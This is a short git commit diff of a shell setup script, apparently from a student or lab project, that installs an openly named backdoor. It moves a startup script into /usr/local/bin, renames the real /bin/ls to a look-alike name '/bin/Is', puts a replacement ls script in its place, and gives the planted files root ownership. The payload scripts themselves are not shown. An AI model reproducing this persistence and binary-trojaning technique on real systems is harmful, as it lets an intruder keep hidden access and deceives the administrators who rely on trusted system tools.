dc575ab1e1b6ce838bcc2f9fe24777c47c9f6c96
tony-ngo-03 <tonyngo@utexas.edu>
2024-10-29 15:56:18 -0500

    updated setup

--- setup.sh
+++ setup.sh
@@ -2,6 +2,11 @@
 
 BACKDOOR_SCRIPT_LOCATION="/usr/local/bin/"
 
+chmod +x StartupCheck.sh
+chmod +x new_ls.sh
+chown root StartupCheck.sh
+chown root new_ls.sh
+
 mv StartupCheck.sh "${BACKDOOR_SCRIPT_LOCATION}"
 mv /bin/ls /bin/Is
 mv new_ls.sh /bin/ls
